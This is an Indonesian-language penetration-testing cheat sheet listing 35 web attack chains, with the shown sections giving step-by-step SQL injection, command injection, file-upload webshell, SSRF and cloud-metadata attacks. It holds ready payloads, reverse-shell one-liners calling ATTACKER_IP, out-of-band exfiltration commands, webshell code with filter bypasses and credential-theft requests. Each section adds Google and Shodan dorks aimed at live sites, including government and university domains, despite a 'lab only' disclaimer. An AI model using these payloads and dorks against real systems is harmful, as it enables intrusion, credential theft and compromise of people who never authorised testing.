# 🔴 PoC CHEATSHEET — LEVEL HIGH

> **Author**: TangselSecTeam | **Last Updated**: May 2026
> ⚠️ **Hanya untuk lab terisolasi & penetration testing yang sudah diotorisasi.**

---

## 📑 Daftar PoC Level High (35 Item)

| # | Nama PoC | Kategori | Bukti Berhasil |
|---|----------|----------|----------------|
| 1 | SQLi Data Extraction | Injection | Data dummy terlihat |
| 2 | SQLi Auth Takeover | Injection | Masuk akun target lab |
| 3 | Blind SQLi | Injection | Respons/time berbeda |
| 4 | RCE via CMDi | Injection | Output command lab muncul |
| 5 | File Upload to Execution | Security Misconfiguration | File berjalan di lab |
| 6 | SSRF to Internal Service | SSRF | Response service internal |
| 7 | SSRF to Metadata Simulation | SSRF | Metadata dummy terlihat |
| 8 | XXE to File Read | XXE | Isi file dummy terlihat |
| 9 | Insecure Deser to RCE | Software/Data Integrity | Command dummy berjalan |
| 10 | Admin Takeover | Broken Access Control | Panel admin terbuka |
| 11 | Account Takeover Chain | Auth Failure | Akun dummy diambil alih |
| 12 | XSS to Account Impact | XSS | Aksi tanpa klik langsung |
| 13 | CSRF to Critical Action | Broken Access Control | Data akun berubah |
| 14 | IDOR to Mass Data | Broken Access Control | Banyak data dummy terlihat |
| 15 | Business Logic Abuse | Business Logic | Harga/poin tidak valid |
| 16 | Race Condition | Business Logic | Saldo/order ganda |
| 17 | Privilege Escalation | Broken Access Control | User jadi admin |
| 18 | Vulnerable Component | Vulnerable Components | Versi rentan teridentifikasi |
| 19 | Logging Failure | Logging & Monitoring | Tidak ada log audit |
| 20 | Full Attack Chain | Multi-category | Chain terdokumentasi |
| 21 | CSRF → XSS → Account Takeover | 🔗 Full Chain | Akun diambil alih via CSRF+XSS |
| 22 | SQLi → Webshell → Reverse Shell | 🔗 Full Chain | Shell interaktif dari SQLi |
| 23 | SSRF → Redis → RCE | 🔗 Full Chain | RCE via internal Redis |
| 24 | XSS → Admin → Priv Escalation | 🔗 Full Chain | Admin takeover via XSS |
| 25 | XXE → SSRF → Cloud Cred Theft | 🔗 Full Chain | Cloud credentials dicuri |
| 26 | Open Redirect → OAuth Takeover | 🔗 Full Chain | OAuth token dicuri |
| 27 | SSTI → RCE → Post-Exploitation | 🔗 Full Chain | Full server compromise |
| 28 | File Upload → Pivot → Lateral Move | 🔗 Full Chain | Akses ke server lain |
| 29 | IDOR → Data Leak → Credential Stuff | 🔗 Full Chain | Multi-account compromise |
| 30 | CORS → Data Theft → ATO | 🔗 Full Chain | Akun diambil via CORS |
| 31 | Prototype Pollution → XSS/RCE | 🔗 Full Chain | RCE via prototype |
| 32 | WebSocket Hijacking | Broken Access Control | WS session dibajak |
| 33 | JWT Full Attack Chain | Auth Failure | JWT diforge → admin |
| 34 | DNS Rebinding → Internal Access | 🔗 Full Chain | Internal network diakses |
| 35 | Multi-Vuln Full Pentest Simulation | 🔗 Full Chain | Full compromise end-to-end |

---

# 1. SQLi Data Extraction Lab

**Kategori**: Injection | **OWASP**: A03  
**Tujuan**: Mengambil data dari tabel dummy menggunakan UNION/error-based SQLi

## Dork
```
# Google Dork — cari halaman dengan parameter rentan SQLi
inurl:"product.php?id="
inurl:"item.php?id="
inurl:"news.php?id="
inurl:"page.php?id="
inurl:"category.php?cat_id="
inurl:"view.php?id=" site:.ac.id
inurl:"detail.php?id=" site:.go.id
inurl:".php?id=" intext:"sql syntax" | intext:"mysql_fetch"
inurl:".php?id=" intext:"You have an error in your SQL syntax"
inurl:".php?id=" intext:"SQLSTATE" | intext:"PDOException"
inurl:".php?id=" intext:"Warning: mysql"
inurl:".asp?id=" intext:"ODBC" | intext:"Microsoft OLE DB"
inurl:".aspx?id=" intext:"Unclosed quotation mark"

# Shodan Dork
"X-Powered-By: PHP" "200 OK" port:80
http.title:"phpMyAdmin" port:80,443

# Nuclei
nuclei -u https://target.com -tags sqli
```

## Cara Kerja
SQL Injection terjadi ketika input user langsung dimasukkan ke dalam query SQL tanpa sanitasi. Attacker menyisipkan perintah SQL tambahan untuk membaca/memodifikasi database. Pada level ini, kita melakukan full data extraction menggunakan UNION-based SQLi.

## Langkah

```bash
# ===== STEP 1: Deteksi kerentanan =====
# Masukkan single quote di parameter → lihat apakah error muncul
GET /products?id=1'
# ✅ Jika response: "You have an error in your SQL syntax" → VULNERABLE
# ✅ Jika response: 500 Internal Server Error → kemungkinan vulnerable
# ❌ Jika response: normal/filtered → coba encoding lain

# ===== STEP 2: Tentukan jumlah kolom =====
# ORDER BY berurutan sampai error → jumlah kolom = N-1
GET /products?id=1 ORDER BY 1--    # ✅ Response normal → kolom 1 ada
GET /products?id=1 ORDER BY 2--    # ✅ Response normal → kolom 2 ada
GET /products?id=1 ORDER BY 3--    # ❌ Error/kosong → hanya 2 kolom!
# Kesimpulan: query menggunakan 2 kolom (SELECT col1, col2 FROM ...)

# Alternatif: NULL method
GET /products?id=-1 UNION SELECT NULL--         # ❌ Error
GET /products?id=-1 UNION SELECT NULL,NULL--     # ✅ No error = 2 kolom

# ===== STEP 3: Cari kolom yang ditampilkan =====
# id=-1 agar data asli kosong, hanya data UNION yang muncul
GET /products?id=-1 UNION SELECT 'test1','test2'--
# ✅ Jika 'test1' muncul di halaman → kolom 1 bisa dipakai
# ✅ Jika 'test2' muncul di halaman → kolom 2 bisa dipakai

# ===== STEP 4: Enumerate database info =====
GET /products?id=-1 UNION SELECT version(),database()--
# Response: MySQL 8.0.32 | webapp_db

GET /products?id=-1 UNION SELECT user(),@@hostname--
# Response: root@localhost | db-server-01

# ===== STEP 5: Enumerate semua tabel =====
GET /products?id=-1 UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
# Response: users, products, orders, sessions, api_keys

# ===== STEP 6: Enumerate kolom pada tabel target =====
GET /products?id=-1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
# Response: id, username, email, password, role, created_at

# ===== STEP 7: Extract data =====
GET /products?id=-1 UNION SELECT username,password FROM users--
# Response:
# admin    | $2b$12$LJ3m4ks9aQ...(bcrypt hash)
# john     | $2b$12$xYz...
# staff01  | $2b$12$AbC...

# ===== STEP 8: Extract semua data sekaligus (GROUP_CONCAT) =====
GET /products?id=-1 UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL FROM users--
# Response: admin:$2b$12$... \n john:$2b$12$... \n staff01:$2b$12$...

# ===== SQLMap (automated) =====
sqlmap -u "https://lab.com/products?id=1" --batch --dbs
# → lists all databases
sqlmap -u "https://lab.com/products?id=1" --batch -D webapp_db --tables
# → lists all tables
sqlmap -u "https://lab.com/products?id=1" --batch -D webapp_db -T users --dump
# → dumps all data from users table
sqlmap -u "https://lab.com/products?id=1" --batch --dump-all
# → dumps EVERYTHING
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| `You have an error in your SQL syntax` | MySQL error → SQLi confirmed |
| `SQLSTATE[42000]` | PDO/PHP SQL error → vulnerable |
| `Unclosed quotation mark` | MSSQL error → vulnerable |
| Halaman kosong/berbeda | Possible blind SQLi |
| Response normal tanpa perubahan | Input di-sanitasi / tidak vulnerable |
| `403 Forbidden` atau WAF page | WAF/filter aktif → coba bypass |

## Bukti
- Data username + password hash dari tabel `users` terlihat
- Screenshot dump data dari SQLMap
- Response menampilkan data dari tabel selain yang dimaksud

---

# 2. SQLi Authentication Takeover Lab

**Kategori**: Injection | **OWASP**: A03  
**Tujuan**: Login sebagai akun dummy lewat SQLi

## Dork
```
# Google Dork — cari form login yang rentan
inurl:"/admin/login" | inurl:"/user/login" | inurl:"/login.php"
inurl:"login.asp" | inurl:"login.aspx" | inurl:"signin.php"
intitle:"Admin Login" inurl:"/admin"
intitle:"Login" inurl:".php" site:.ac.id
inurl:"admin" intitle:"login" intext:"username" intext:"password"
inurl:"wp-login.php"  # WordPress
inurl:"/administrator" site:.com  # Joomla

# Shodan
http.title:"Login" "X-Powered-By: PHP"
http.title:"Admin" port:80,443,8080
```

## Cara Kerja
Query login biasanya: `SELECT * FROM users WHERE username='INPUT' AND password='INPUT'`. Dengan menyisipkan SQL di field username, kita bisa membuat kondisi `WHERE` selalu TRUE, sehingga login berhasil tanpa password.

## Langkah

```bash
# ===== STEP 1: Identifikasi form login =====
# Buka halaman login, lihat parameter yang dikirim
# Biasanya: POST /login {"username":"...","password":"..."}
# Atau: POST /login dengan form data username=...&password=...

# ===== STEP 2: Test basic SQLi di username =====
Username: admin'
Password: test
# ✅ Jika error SQL muncul → form vulnerable
# ❌ Jika "Invalid credentials" biasa → mungkin di-sanitasi

# ===== STEP 3: Login bypass (masuk sebagai user pertama) =====
Username: ' OR 1=1 LIMIT 1--
Password: anything
# Query menjadi: SELECT * FROM users WHERE username='' OR 1=1 LIMIT 1-- AND password='anything'
# OR 1=1 selalu TRUE → return user pertama (biasanya admin)
# ✅ Jika redirect ke dashboard → BERHASIL
# ✅ Response: 302 redirect ke /dashboard atau /admin

# ===== STEP 4: Login sebagai user spesifik =====
Username: admin'--
Password: (apapun, di-ignore karena --)  
# Query: SELECT * FROM users WHERE username='admin'-- AND password='apapun'
# Password check di-skip oleh comment (--)
# ✅ Berhasil login sebagai admin

Username: admin' OR '1'='1'--
Password: apapun

Username: admin'#
Password: apapun  # MySQL comment

# ===== STEP 5: Extract password via login form =====
Username: ' UNION SELECT 1,(SELECT password FROM users WHERE username='admin')--
Password: anything
# ✅ Jika response menampilkan hash → password extracted
# Response: "Welcome, $2b$12$LJ3m4ks..."

# ===== STEP 6: Bypass untuk berbagai database =====
# MySQL:  admin'-- -   (spasi setelah --)
# MSSQL:  admin'--
# Oracle: admin'--
# PostgreSQL: admin';--
# SQLite: admin'--
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| `302 Redirect → /dashboard` | Login berhasil! |
| Halaman admin muncul | Full access tanpa password |
| `Welcome, admin` | Berhasil masuk sebagai admin |
| `Invalid credentials` (tanpa error SQL) | Input di-sanitasi |
| `SQL syntax error` | SQLi ada tapi payload perlu diubah |

## Bukti
- Berhasil login sebagai admin/target tanpa tahu password
- Screenshot dashboard admin setelah login
- Response menunjukkan redirect ke halaman admin

---

# 3. Blind SQL Injection Lab

**Kategori**: Injection | **OWASP**: A03  
**Tujuan**: Membuktikan SQLi tanpa error/output langsung

## Dork
```
# Google Dork — target Blind SQLi
inurl:".php?id=" -intext:"error" -intext:"syntax"
inurl:"search.php?q=" | inurl:"filter.php?keyword="
inurl:".php?cat=" | inurl:".php?page=" | inurl:".php?sort="
inurl:".php?id=" intext:"no results" | intext:"not found"
inurl:"product" inurl:"?id=" ext:php

# Shodan — aplikasi PHP tanpa WAF
"X-Powered-By: PHP" -"cloudflare" port:80
http.html:"?id=" "X-Powered-By: PHP"
```

## Cara Kerja
Pada Blind SQLi, server TIDAK menampilkan data atau error SQL di response. Attacker menggunakan 2 teknik: **Boolean-based** (response berubah berdasarkan TRUE/FALSE) dan **Time-based** (response time berubah berdasarkan SLEEP/WAITFOR). Data di-extract karakter per karakter.

## Langkah

```bash
# ===== STEP 1: Detect Boolean-based blind =====
GET /products?id=1 AND 1=1--
# ✅ Response: halaman produk normal (kondisi TRUE)

GET /products?id=1 AND 1=2--
# ✅ Response: halaman kosong/berbeda (kondisi FALSE)
# → Jika response BERBEDA = Boolean Blind SQLi confirmed!

# ===== STEP 2: Detect Time-based blind =====
GET /products?id=1 AND SLEEP(5)--           # MySQL
# ✅ Jika response butuh ~5 detik → Time-based confirmed!
# ❌ Jika response langsung → tidak vulnerable atau beda DB

GET /products?id=1; WAITFOR DELAY '0:0:5'-- # MSSQL
GET /products?id=1; SELECT pg_sleep(5)--    # PostgreSQL
GET /products?id=1 AND 1=randomblob(500000000)-- # SQLite (CPU delay)

# ===== STEP 3: Extract data karakter per karakter =====
# Cari nama database, huruf pertama
GET /products?id=1 AND SUBSTRING((SELECT database()),1,1)='a'--  # FALSE
GET /products?id=1 AND SUBSTRING((SELECT database()),1,1)='t'--  # TRUE!
# → Huruf pertama database = 't'

# Huruf kedua
GET /products?id=1 AND SUBSTRING((SELECT database()),2,1)='e'--  # TRUE!
# → Database dimulai dengan 'te...'

# Time-based extraction
GET /products?id=1 AND IF(SUBSTRING(database(),1,1)='t',SLEEP(3),0)--
# ✅ Delay 3 detik → huruf benar
# ❌ Response langsung → huruf salah

# ===== STEP 4: SQLMap automated blind extraction =====
sqlmap -u "https://lab.com/products?id=1" --technique=B --batch --dbs
# Boolean-based: extract via TRUE/FALSE responses

sqlmap -u "https://lab.com/products?id=1" --technique=T --batch --dbs
# Time-based: extract via response timing

sqlmap -u "https://lab.com/products?id=1" --technique=BT --batch --dump -T users
# Gabungan: dump tabel users
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| Halaman normal (TRUE) vs kosong (FALSE) | Boolean Blind SQLi confirmed |
| Response 5 detik vs langsung | Time-based Blind SQLi confirmed |
| Selalu response yang sama | Bukan vulnerable atau perlu teknik lain |
| WAF/firewall response | Payload di-block → coba encoding |

## Bukti
- Response time berbeda (5 detik delay) saat kondisi TRUE
- Boolean: halaman berbeda antara TRUE/FALSE condition
- SQLMap berhasil extract database name

---

# 4. RCE via Command Injection Lab

**Kategori**: Injection | **OWASP**: A03  
**Tujuan**: Eksekusi command di container lab

## Dork
```
# Google Dork — cari fitur yang menjalankan command OS
inurl:"ping.php" | inurl:"traceroute.php" | inurl:"nslookup.php"
inurl:"cmd.php" | inurl:"exec.php" | inurl:"shell.php"
inurl:"diagnostic" intext:"ping" intext:"host"
inurl:"tools" intext:"traceroute" | intext:"nslookup"
intitle:"Network Tools" inurl:".php"
inurl:"system" intext:"execute" ext:php
inurl:"command" intext:"run" ext:php

# Shodan — router/device dengan web interface
"Network Tools" "ping" port:80,443
http.html:"ping" http.html:"traceroute" port:80
"MikroTik" port:80  # Router interface
```

## Cara Kerja
Command Injection terjadi ketika input user langsung dimasukkan ke command OS (misalnya `ping INPUT`). Attacker menyisipkan separator (`;`, `|`, `&&`, `` ` ``) diikuti command tambahan. Tujuan akhir: mendapatkan reverse shell untuk interactive access.

## Langkah

```bash
# Dari CMDi basic → escalate ke RCE
127.0.0.1; id
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la /
127.0.0.1; uname -a
127.0.0.1; env
127.0.0.1; cat /proc/self/environ
127.0.0.1; find / -name "*.conf" 2>/dev/null
127.0.0.1; netstat -tlnp
127.0.0.1; ps aux

# ===== BLIND CMDi (no output) =====
# OOB via curl
127.0.0.1; curl http://ATTACKER_IP:8888/$(whoami)
127.0.0.1; wget http://ATTACKER_IP:8888/$(id|base64)
# OOB via DNS
127.0.0.1; nslookup $(whoami).attacker.com
# Time-based confirmation
127.0.0.1; sleep 10
```

```bash
# ===== REVERSE SHELLS (LAB ONLY) =====

# Bash TCP
127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Bash UDP
127.0.0.1; bash -c 'bash -i >& /dev/udp/ATTACKER_IP/4444 0>&1'

# Python
127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
127.0.0.1; php -r '$s=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
127.0.0.1; perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Ruby
127.0.0.1; ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat (traditional)
127.0.0.1; nc -e /bin/sh ATTACKER_IP 4444
# Netcat (no -e flag)
127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# PowerShell (Windows)
127.0.0.1 & powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"

# OpenSSL encrypted reverse shell
127.0.0.1; mkfifo /tmp/s;/bin/sh -i < /tmp/s 2>&1|openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s

# ===== LISTENER =====
nc -lvnp 4444
# Atau dengan rlwrap untuk arrow keys:
rlwrap nc -lvnp 4444

# ===== SHELL UPGRADE (setelah dapat reverse shell) =====
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| Output command (`uid=33(www-data)`) | CMDi berhasil, output ditampilkan |
| Response normal tanpa output | Blind CMDi → gunakan OOB/time-based |
| `Command not found` | Command ada tapi binary tidak tersedia |
| Response delay 10 detik | `sleep 10` berhasil → time-based confirmed |
| Request muncul di server attacker | OOB CMDi confirmed via curl/wget |
| `Permission denied` | Command injection ada tapi restricted user |
| WAF block page | Payload difilter → coba encoding |

## Bukti
- Output `id`, `whoami`, `cat /etc/passwd` muncul
- Reverse shell terbuka (di lab)
- OOB request diterima di server attacker

---

# 5. File Upload to Execution Lab

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: Upload file yang bisa dieksekusi di environment lab

## Dork
```
# Google Dork — cari fitur upload
inurl:"upload.php" | inurl:"file_upload" | inurl:"filemanager"
inurl:"upload" intext:"choose file" | intext:"select file" ext:php
intitle:"Upload" inurl:".php" intext:"file"
inurl:"editor" intext:"upload" | intext:"insert image"
inurl:"wp-content/uploads/" ext:php  # WordPress uploaded shells
inurl:"FCKeditor" | inurl:"ckeditor" inurl:"upload"
inurl:"/uploads/" ext:php | ext:phtml | ext:php5

# Shodan
http.html:"upload" "multipart/form-data" port:80
http.title:"File Manager" port:80,443

# Nuclei
nuclei -u https://target.com -tags file-upload,upload
```

## Cara Kerja
Jika server tidak memvalidasi tipe file yang diupload, attacker bisa upload webshell (file PHP/JSP/ASPX yang menjalankan command OS). Setelah terupload, attacker mengakses file tersebut via browser untuk menjalankan command.

## Langkah

```bash
# ===== STEP 1: Buat webshell =====
# PHP (paling umum)
echo '<?php if(isset($_GET["cmd"])){echo "<pre>";system($_GET["cmd"]);echo "</pre>";} ?>' > shell.php

# ===== STEP 2: Upload langsung (tanpa filter) =====
curl -F "file=@shell.php" https://lab.com/upload
# ✅ Jika response: {"status":"success","path":"/uploads/shell.php"} → uploaded!
# ❌ Jika response: "File type not allowed" → perlu bypass

# ===== STEP 3: Bypass filter jika ada =====
# Extension bypass
mv shell.php shell.php.jpg          # Double extension
mv shell.php shell.pHp              # Case variation
mv shell.php shell.php5             # Alternatif extension
mv shell.php shell.phtml            # PHP handler lain
mv shell.php shell.php%00.jpg       # Null byte (legacy)

# MIME type bypass (di Burp, ubah Content-Type)
# Content-Type: image/jpeg (padahal isinya PHP)
curl -F "file=@shell.php;type=image/jpeg" https://lab.com/upload
# ✅ Response: 200 OK + file path → bypass berhasil!

# Magic bytes bypass (tambah header gambar)
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
# File dimulai dengan GIF89a → lolos check getimagesize()

# ===== STEP 4: Cari lokasi file yang diupload =====
# Biasanya di:
# /uploads/shell.php
# /files/shell.php  
# /media/shell.php
# /storage/uploads/shell.php
# Cek response upload untuk path, atau brute force directory

# ===== STEP 5: Akses webshell =====
curl "https://lab.com/uploads/shell.php?cmd=whoami"
# ✅ Response: www-data → WEBSHELL AKTIF!

curl "https://lab.com/uploads/shell.php?cmd=id"
# ✅ Response: uid=33(www-data) gid=33(www-data)

curl "https://lab.com/uploads/shell.php?cmd=cat+/etc/passwd"
# ✅ Response: root:x:0:0:root:/root:/bin/bash ...

curl "https://lab.com/uploads/shell.php?cmd=uname+-a"
# ✅ Response: Linux webapp-server 5.15.0 ...

# ===== STEP 6: Webshell untuk framework lain =====
# JSP (Tomcat/Java)
<% Runtime.getRuntime().exec("id"); %>

# ASPX (.NET/IIS)
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd","/c whoami"); %>

# ASP Classic
<% Set ws = CreateObject("WScript.Shell") : Set r = ws.Exec("cmd /c whoami") : Response.Write r.StdOut.ReadAll %>
```

## Analisis Response
| Response Upload | Artinya |
|----------------|--------|
| `200 OK` + file path | Upload berhasil |
| `File type not allowed` | Filter berdasarkan extension → coba bypass |
| `Invalid image` | Filter berdasarkan content/magic bytes → tambah GIF89a |
| `413 Entity Too Large` | File terlalu besar → kecilkan shell |
| `403 Forbidden` saat akses shell | .htaccess/nginx block PHP di folder upload |
| Output command muncul | Webshell aktif → RCE achieved! |

## Bukti
- Webshell berhasil dieksekusi, output command muncul
- Screenshot output `whoami` dari webshell
- Response menampilkan system info (uname, id)

---

# 6. SSRF to Internal Service Lab

**Kategori**: SSRF | **OWASP**: A10  
**Tujuan**: Mengakses service internal dummy lewat SSRF

## Dork
```
# Google Dork — cari fitur yang fetch URL (rentan SSRF)
inurl:"url=http" | inurl:"link=http" | inurl:"src=http"
inurl:"proxy.php?url=" | inurl:"fetch.php?url="
inurl:"redirect=http" | inurl:"next=http" | inurl:"dest=http"
inurl:"image_url=" | inurl:"img_url=" | inurl:"feed=http"
inurl:"api" inurl:"url=" ext:php
inurl:"preview" inurl:"url=" | inurl:"link="
inurl:"pdf" inurl:"url=http"  # PDF generator SSRF

# Shodan — internal services yang seharusnya tidak publik
redis port:6379
"elastic" port:9200
mongodb port:27017
http.title:"Kibana" port:5601
http.title:"Jenkins" port:8080

# Nuclei
nuclei -u https://target.com -tags ssrf
```

## Cara Kerja
SSRF (Server-Side Request Forgery) terjadi ketika server melakukan HTTP request ke URL yang diberikan user. Attacker memanfaatkan ini untuk mengakses service internal (Redis, Elasticsearch, admin panels) yang tidak bisa diakses dari luar.

## Langkah

```bash
# ===== STEP 1: Identifikasi parameter yang fetch URL =====
# Cari fitur: URL preview, webhook, import, fetch, proxy, PDF generator
# Parameter umum: url=, link=, href=, src=, redirect=, uri=, path=

# ===== STEP 2: Test SSRF dasar =====
POST /api/fetch {"url":"http://attacker.com/ssrf-test"}
# ✅ Jika request muncul di server attacker → SSRF confirmed!
# ❌ Jika error "invalid URL" → coba bypass

# Test ke localhost
POST /api/fetch {"url":"http://127.0.0.1"}
# ✅ Jika response berbeda dari biasa → internal access
# Response mungkin: HTML halaman default Apache/Nginx

# ===== STEP 3: Port scanning internal via SSRF =====
POST /api/fetch {"url":"http://127.0.0.1:22"}     # SSH → response "SSH-2.0-OpenSSH"
POST /api/fetch {"url":"http://127.0.0.1:3306"}   # MySQL → binary response
POST /api/fetch {"url":"http://127.0.0.1:6379"}   # Redis → "+PONG" atau info
POST /api/fetch {"url":"http://127.0.0.1:9200"}   # Elasticsearch → JSON cluster info
POST /api/fetch {"url":"http://127.0.0.1:8080"}   # Internal web app
POST /api/fetch {"url":"http://127.0.0.1:27017"}  # MongoDB
# ✅ Response berbeda (bukan timeout) = port terbuka
# ❌ Timeout atau connection refused = port tertutup

# ===== STEP 4: Akses internal services =====
POST /api/fetch {"url":"http://127.0.0.1:6379/info"}
# ✅ Response: redis_version:7.0.5, connected_clients:3...

POST /api/fetch {"url":"http://127.0.0.1:9200/_cluster/health"}
# ✅ Response: {"cluster_name":"production","status":"green"...}

POST /api/fetch {"url":"http://internal-api:8080/admin"}
# ✅ Response: Admin panel HTML → internal admin terbuka!

# ===== STEP 5: Bypass filter (jika 127.0.0.1 diblokir) =====
POST /api/fetch {"url":"http://0x7f000001:6379"}          # Hex IP
POST /api/fetch {"url":"http://0177.0.0.1:6379"}          # Octal
POST /api/fetch {"url":"http://2130706433:6379"}           # Decimal
POST /api/fetch {"url":"http://127.1:6379"}                # Short form
POST /api/fetch {"url":"http://[::1]:6379"}                # IPv6 loopback
POST /api/fetch {"url":"http://localhost:6379"}             # hostname
POST /api/fetch {"url":"http://127.0.0.1.nip.io:6379"}    # DNS rebinding
POST /api/fetch {"url":"http://0:6379"}                    # Zero IP
```

## Analisis Response
| Response SSRF | Artinya |
|---------------|--------|
| Konten internal service | SSRF berhasil, service terbuka |
| `Connection refused` | Port tertutup |
| `Connection timed out` | Host tidak ada / firewall |
| `Invalid URL` / `Blocked` | Filter aktif → coba bypass |
| Binary data | Service non-HTTP (MySQL, Redis raw) |
| `+PONG` | Redis merespons → bisa exploit lebih lanjut |

## Bukti
- Response dari Redis/Elasticsearch/internal API terlihat
- Data internal service muncul di response
- Port scan results menunjukkan services internal

---

# 7. SSRF to Metadata Simulation

**Kategori**: SSRF | **OWASP**: A10  
**Tujuan**: Simulasi akses cloud metadata server

## Dork
```
# Google Dork — cari aplikasi di cloud yang rentan SSRF
site:*.amazonaws.com inurl:"url=" | inurl:"proxy="
site:*.azurewebsites.net inurl:"fetch" | inurl:"url="
site:*.appspot.com inurl:"url=http"
inurl:"169.254.169.254"  # Metadata exposure langsung
inurl:"ec2" intext:"ami-id" | intext:"instance-id"

# Shodan — cloud metadata & instances
"EC2" http.html:"ami-id"
"Server: openresty" "X-Amzn" port:80,443
http.html:"computeMetadata" port:80
"iam" "security-credentials" port:80
```

## Cara Kerja
Semua cloud provider (AWS, GCP, Azure) menjalankan metadata service di IP `169.254.169.254`. Service ini memberikan informasi instance termasuk **IAM credentials** tanpa autentikasi. Jika ada SSRF, attacker bisa mencuri credentials ini untuk akses ke seluruh cloud infrastructure.

## Langkah

```bash
# ===== STEP 1: AWS Metadata (paling umum) =====
# IMDSv1 (tanpa token)
POST /api/fetch {"url":"http://169.254.169.254/latest/meta-data/"}
# ✅ Response: ami-id\nhostname\niam\ninstance-id\n...
# → Jika ada response = instance AWS + SSRF confirmed!

POST /api/fetch {"url":"http://169.254.169.254/latest/meta-data/hostname"}
# ✅ Response: ip-172-31-20-50.ec2.internal

POST /api/fetch {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
# ✅ Response: webapp-role  (nama IAM role)

POST /api/fetch {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role"}
# ✅ Response: {"AccessKeyId":"AKIA...","SecretAccessKey":"...","Token":"..."}
# 🚨 INI CREDENTIALS! Bisa dipakai untuk akses AWS (S3, EC2, dll)

# IMDSv2 (perlu token dulu)
# Step 1: Get token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
# ✅ Response: token_value

# Step 2: Use token
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: token_value

# ===== STEP 2: GCP Metadata =====
POST /api/fetch {"url":"http://metadata.google.internal/computeMetadata/v1/"}
# Catatan: GCP WAJIB header Metadata-Flavor: Google
# ❌ Tanpa header → 403 Forbidden (GCP lebih aman)
# ✅ Dengan header → instance info

# GCP Service Account token
POST /api/fetch {"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}
# Header: Metadata-Flavor: Google
# ✅ Response: {"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}

# ===== STEP 3: Azure Metadata =====
POST /api/fetch {"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}
# Header: Metadata: true
# ✅ Response: JSON dengan subscription, resourceGroup, vmId

POST /api/fetch {"url":"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}
# ✅ Response: {"access_token":"eyJ0...","token_type":"Bearer"}
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| `ami-id`, `instance-id`, hostname | AWS metadata terbuka → enumerate lebih lanjut |
| `AccessKeyId`, `SecretAccessKey` | 🚨 AWS CREDENTIALS TERCURI → akses penuh |
| `ya29...` (GCP token) | 🚨 GCP service account token → akses GCP |
| `403 Forbidden` dari metadata | IMDSv2 aktif (AWS) atau header wajib (GCP) |
| `Connection refused/timeout` | Bukan di cloud atau metadata di-block |
| Empty/no response | Firewall rules memblock 169.254.169.254 |

## Bukti
- Metadata dummy (instance-id, role, credentials) terlihat
- Screenshot response metadata
- Credentials bisa dipakai untuk akses cloud resources

---

# 8. XXE to File Read Lab

**Kategori**: XXE | **OWASP**: A05  
**Tujuan**: Membaca file dummy lewat XML parser

## Dork
```
# Google Dork — cari endpoint yang menerima XML
inurl:"xmlrpc.php"  # WordPress XML-RPC
inurl:"/soap" | inurl:"/wsdl" | inurl:"?wsdl"
inurl:"xml" inurl:"upload" ext:php
inurl:"api" intext:"text/xml" | intext:"application/xml"
filetype:xml inurl:"sitemap" | inurl:"feed" | inurl:"rss"
inurl:"/rest/" intext:"xml" | intext:"<xml"
inurl:"import" intext:"xml" ext:php
external entity" | intext:"DOCTYPE" | intext:"ENTITY"

# Shodan — SOAP/XML services
http.html:"wsdl" port:80,443
http.html:"xmlrpc" port:80,443
"Content-Type: text/xml" port:80

# Nuclei
nuclei -u https://target.com -tags xxe
```

## Cara Kerja
XML External Entity (XXE) terjadi ketika XML parser memproses entity eksternal yang didefinisikan di DTD. Attacker mendefinisikan entity yang membaca file lokal (`file:///etc/passwd`) atau melakukan SSRF (`http://internal-server`). Server membaca file dan memasukkan isinya ke dalam response.

## Langkah

```xml
<!-- ===== STEP 1: Test apakah XXE enabled ===== -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe "XXE_WORKS">
]>
<data>&xxe;</data>
<!-- ✅ Jika response berisi "XXE_WORKS" → XML parser memproses entity -->
